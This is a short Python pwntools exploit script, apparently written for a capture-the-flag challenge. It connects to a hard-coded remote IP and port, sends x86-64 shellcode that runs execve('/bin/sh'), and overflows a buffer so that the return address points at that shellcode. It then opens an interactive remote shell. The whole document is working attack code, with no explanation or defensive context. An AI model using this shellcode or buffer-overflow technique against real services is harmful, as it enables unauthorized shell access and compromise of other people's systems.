from pwn import *

shellcode = "\x48\x31\xC0\x48\xBF\x2F\x62\x69\x6E\x2F\x73\x68\x00\x57\x48\x89\xE7\x48\xC7\xC6\x00\x00\x00\x00\x48\xC7\xC2\x00\x00\x00\x00\xB0\x3B\x0F\x05"
addr_a = 0x601090
padding = "a"*15 + "\x00"

s = remote("103.237.99.35", 26124)
s.recv()

payload = padding + shellcode
s.sendline(payload)
print s.recv()
payload = "a"*0x38 + "\x90\x10\x60\x00\x00\x00\x00"
s.sendline(payload)
s.interactive()
s.close()